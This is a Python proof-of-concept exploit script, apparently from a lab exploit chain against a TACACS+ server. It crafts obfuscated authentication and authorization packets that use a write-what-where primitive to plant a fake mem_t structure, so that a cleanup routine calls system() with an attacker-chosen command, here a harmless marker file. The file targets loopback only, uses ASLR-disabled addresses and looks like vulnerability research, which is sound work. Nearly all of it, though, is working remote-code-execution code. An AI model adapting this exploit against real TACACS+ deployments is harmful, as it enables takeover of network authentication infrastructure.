#!/usr/bin/env python3
"""W134: replace session->mem with a fake mem_t in surviving prime plaintext.

Uses the measured W129 `t`-slot write-what-where:
  i=12: l=140 -> copy 136 transit bytes, t: 32 -> 168 (the `t` slot)
  i=13: l=12  -> write &session->mem-8 into the `t` slot (t <- &session->mem)
  i=14: l=12  -> write the fake mem_t address into &session->mem
The fake mem_t sits in the prime pattern at byte offset 200 (in+1356):
  {u.list=0, type=0, arr_count=1, arr=in+1388}
  arr[0] = {f=system, p=in+1404}  and  in+1404 = "touch /tmp/tacplus-rce-marker"
type 0 skips memlist/mempool destroy; mem_destroy calls arr[0].f(arr[0].p)
before its two invalid frees. Gdb-disabled ASLR makes the addresses stable.
No off-loopback traffic.
"""
import argparse
import hashlib
import socket
import struct


def pad(sid, key, version, seq, prev=b""):
    return hashlib.md5(sid + key + bytes([version, seq]) + prev).digest()


def obf(body, sid, key, version, seq):
    p = pad(sid, key, version, seq)
    out = bytearray()
    for i in range(0, len(body), 16):
        c = body[i:i + 16]
        out.extend(a ^ b for a, b in zip(c, p))
        p = pad(sid, key, version, seq, p)
    return bytes(out)


def wire_hdr(ptype, seq, sid, body, key, version=0xC0, flags=0):
    e = obf(body, sid, key, version, seq)
    hdr = struct.pack("!BBBBI", version, ptype, seq, flags, int.from_bytes(sid, "big"))
    hdr += struct.pack("!I", len(body))
    return hdr + e


def authen_start(sid, key, user, version=0xC0):
    u = user.encode()
    return wire_hdr(1, 1, sid, bytes([1, 0, 1, 1, len(u), 0, 0, 0]) + u, key, version)


def authen_cont_prime(sid, key, seq, body_len, pattern_body_off, pattern, version=0xC0):
    data_len = body_len - 5
    fixed = struct.pack("!HHB", 0, data_len, 0)
    data = bytearray(b"P" * data_len)
    off = pattern_body_off - 5
    data[off:off + len(pattern)] = pattern
    return wire_hdr(1, seq, sid, fixed + bytes(data), key, version)


def author_trigger(sid, key, seq, table, data, version=0xC0):
    fixed = bytes([6, 1, 1, 1, 0, 0, 0, len(table)])
    return wire_hdr(2, seq, sid, fixed + bytes(table) + data, key, version)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=5091)
    ap.add_argument("--key", default="demo")
    ap.add_argument("--trigger-sid", default="aabbccdd")
    ap.add_argument("--user", default="demo")
    ap.add_argument("--in-addr", default="0x5555555fda20",
                    help="measured stable lab buffer address (gdb disables ASLR)")
    ap.add_argument("--system-addr", default="0x7ffff7c58750")
    ap.add_argument("--marker", default="/tmp/tacplus-rce-marker")
    ap.add_argument("--pattern-off", type=int, default=1112)
    ap.add_argument("--prime-len", type=int, default=2000)
    ap.add_argument("--no-prime", action="store_true")
    ap.add_argument("--data",
                    default="cmd=AAAAcmd=BBBBcmd=CCCCcmd=DDDDcmd=EEEEcmd=FFFFcmd=GGGGcmd=HHHH")
    ap.add_argument("--timeout", type=float, default=3.0)
    # Accepted and ignored: run_gdb2.py always passes these.
    ap.add_argument("--arg0", type=int, default=8)
    ap.add_argument("--rest", type=int, default=19)
    ap.add_argument("--rest-byte", type=int, default=8)
    a = ap.parse_args()

    sid = bytes.fromhex("11223344")
    key = a.key.encode()
    in_addr = int(a.in_addr, 16)
    pattern_base = in_addr + 1156
    smem_slot = in_addr + 0xa8
    fake_off, arr_off, cmd_off = 200, 232, 248
    fake_addr = pattern_base + fake_off
    arr_addr = pattern_base + arr_off
    cmd_addr = pattern_base + cmd_off
    system_addr = int(a.system_addr, 16)
    command = ("touch " + a.marker).encode() + b"\x00"

    # i=12 transit: 136 bytes to cmdline+32..+167. Restore the saved cmdline
    # pointer (copied index 104) to smem_slot and the loop counter i (128) to 12.
    transit = bytearray(b"F" * 136)
    transit[104:112] = smem_slot.to_bytes(8, "little")
    transit[128:136] = (12).to_bytes(8, "little")

    pattern = bytearray(b"X" * 400)
    pattern[0:4] = b"cmd="
    pattern[4:140] = transit
    pattern[140:144] = b"cmd="
    pattern[144:152] = (smem_slot - 8).to_bytes(8, "little")
    pattern[152:156] = b"cmd="
    pattern[156:164] = fake_addr.to_bytes(8, "little")

    fake = bytearray(32)
    fake[0:8] = b"\x00" * 8                  # u.list (unused for type 0)
    fake[8:12] = (0).to_bytes(4, "little")   # type = 0 (skip list/pool destroy)
    fake[12:16] = (1).to_bytes(4, "little")  # arr_count
    fake[16:24] = arr_addr.to_bytes(8, "little")
    pattern[fake_off:fake_off + 32] = fake
    pattern[arr_off:arr_off + 8] = system_addr.to_bytes(8, "little")
    pattern[arr_off + 8:arr_off + 16] = cmd_addr.to_bytes(8, "little")
    pattern[cmd_off:cmd_off + len(command)] = command

    table = [8] * 20
    for si, val in ((8, 255), (9, 255), (10, 255), (11, 255),
                    (12, 140), (13, 12), (14, 12)):
        table[si] = val
    for si in range(15, 20):
        table[si] = 0

    s = socket.create_connection(("127.0.0.1", a.port), timeout=a.timeout)
    s.settimeout(a.timeout)

    if not a.no_prime:
        p1 = authen_start(sid, key, a.user)
        s.sendall(p1)
        try:
            r1 = s.recv(65536)
        except socket.timeout:
            r1 = b""
        print(f"seq1 sent={len(p1)} reply_len={len(r1)}")

        p2 = authen_cont_prime(sid, key, 3, a.prime_len, a.pattern_off, bytes(pattern))
        s.sendall(p2)
        try:
            r2 = s.recv(65536)
        except socket.timeout:
            r2 = b""
        print(f"seq3 sent={len(p2)} reply_len={len(r2)}")

    p3 = author_trigger(bytes.fromhex(a.trigger_sid), key, 1, table, a.data.encode())
    s.sendall(p3)
    try:
        r3 = s.recv(65536)
    except socket.timeout:
        r3 = b""
    print(f"trigger sent={len(p3)} reply_len={len(r3)} reply={r3[:64].hex()}")
    print(f"in=0x{in_addr:x} smem_slot=0x{smem_slot:x} fake=0x{fake_addr:x} "
          f"arr=0x{arr_addr:x} cmd=0x{cmd_addr:x} system=0x{system_addr:x}")
    s.close()


if __name__ == "__main__":
    main()
